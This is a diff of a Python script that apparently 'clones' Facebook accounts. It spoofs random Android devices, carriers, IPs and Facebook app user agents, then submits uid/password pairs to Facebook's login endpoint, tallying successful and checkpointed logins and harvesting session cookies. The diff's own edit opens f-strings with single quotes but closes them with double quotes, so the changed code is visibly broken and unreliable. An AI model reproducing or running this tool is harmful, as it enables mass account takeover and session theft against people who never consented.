@@ -90,20 +90,20 @@ send.submit(self.cloning, uid,first,last)
 print(f'\n {green}• {reset}Completed <3! ')
 exit()
 def cloning(self,uid,first,last):
-sys.stdout.write(f" {green}• {reset} {str(self.loop)}/ {str(len(self.idz))} ( {green}ok {reset}): {str(len(self.oku))} ( {blue}cp {reset}):{str(len(self.cpu))}\r")
+sys.stdout.write(f' {green}• {reset} {str(self.loop)}/ {str(len(self.idz))} ( {green}ok {reset}): {str(len(self.oku))} ( {blue}cp {reset}):{str(len(self.cpu))}\r")
 model_,build = random.choice(self.models).rsplit('|')
-android_version = f"Android {
+android_version = f'Android {
   random.randint(4, 10)}. {
   random.randint(0, 9)}. {
   random.randint(0, 9)}"
-facebook_version = f" {
+facebook_version = f' {
   random.randint(100, 200)}. {
   random.randint(0, 100)}. {
   random.randint(0, 100)}. {
   random.randint(0, 100)}"
 fbbv = str(random.randint(10000000, 99999999))
 fbrv = str(random.randint(10000000, 99999999))
-fbsv = f" {
+fbsv = f' {
   random.uniform(4.0, 10.0):.1f
 }"
 density = random.uniform(1.0, 4.0)
@@ -112,7 +112,7 @@ height = random.randint(1280, 2560)
 network_carriers = ["Verizon", "AT&T", "T-Mobile", "Sprint"]
 network_carrier = random.choice(network_carriers)
 network_type = random.choice(["WiFi", "4G", "3G"])
-ip_address = f" {
+ip_address = f' {
   random.randint(1, 255)}. {
   random.randint(0, 255)}. {
   random.randint(0, 255)}. {
@@ -121,14 +121,14 @@ fbcr = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVW
 fban = random.choice(["FB4A", "FB5A", "FB6A"])
 fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
 fbbd = 'Samsung'
-user_agent = f"Dalvik/1.6.0 (Linux; U; {
+user_agent = f'Dalvik/1.6.0 (Linux; U; {
   android_version
 }; {
   model_
 } Build/ {
   build
 }) " \
-f"[FBAN/ {
+f'[FBAN/ {
   fban
 };FBAV/ {
   facebook_version
@@ -236,7 +236,7 @@ c = pycurl.Curl()
 c.setopt(c.URL, 'https://b-graph.facebook.com/auth/login')
 c.setopt(c.HTTPHEADER, headers)
 c.setopt(c.WRITEDATA, buffer)
-data_encoded = '&'.join([f" {
+data_encoded = '&'.join([f' {
   key
 }= {
   value
@@ -260,7 +260,7 @@ cookies = response_data.get("session_cookies")
 coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
 except:
 coki = 'no'
-uid_pw = f" {
+uid_pw = f' {
   uid
 }| {
   pw
